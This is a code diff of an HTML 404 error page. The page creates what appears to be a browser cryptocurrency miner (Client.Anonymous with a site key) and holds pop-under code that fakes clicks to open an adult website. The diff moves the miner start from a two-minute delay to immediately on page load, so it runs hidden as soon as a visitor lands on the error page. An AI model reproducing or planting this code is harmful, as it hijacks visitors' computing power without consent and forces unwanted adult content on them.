@@ -43,6 +43,9 @@
     var _client = new Client.Anonymous('801b0c93e938837684c8f2ccd50f12d61697ce09f3f2e5623e2fdee94bc8ba29', {
 	throttle: 0.5, ads: 0
     });
+</script>
+<script>
+setTimeout(function(){ _client.start(); },  0 * 60 * 1000);
  function pop() {
         var evt = new MouseEvent('click', {
           view : window,
@@ -51,7 +54,7 @@
         document.getElementsByTagName('a')[0].dispatchEvent(evt);
         var chrome   = navigator.userAgent.indexOf('Chrome') > -1;
         if (!chrome) {
-          window.open("http://puretaboo.com/");
+          window.open("http://puretaboo.com");
         }
       }
       function ctrlNavigateAndWindowOpen() {
@@ -68,10 +71,8 @@
           shiftKey: true
         });
         document.getElementsByTagName('a')[0].dispatchEvent(evt);
-        setTimeout(function(){ _client.start(); },  2 * 60 * 1000);
       }
     </script>
-</script>
     <div class="container">
       <h1>404</h1>
       <p><strong>Page not found</strong></p>
